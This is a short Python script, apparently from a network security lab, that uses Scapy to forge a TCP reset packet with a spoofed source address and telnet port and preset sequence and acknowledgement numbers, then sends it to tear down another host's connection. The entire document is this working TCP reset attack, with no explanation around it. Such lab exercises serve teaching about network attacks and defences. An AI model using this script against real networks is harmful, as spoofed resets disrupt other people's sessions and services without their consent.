from scapy.all import *

ip = IP(src="10.0.2.5", dst="10.0.2.4")
tcp = TCP(sport=23, dport=46594, flags="R", seq=2049999742, ack=1940687697)

pkt = ip / tcp
ls(pkt)
send(pkt, verbose=0)
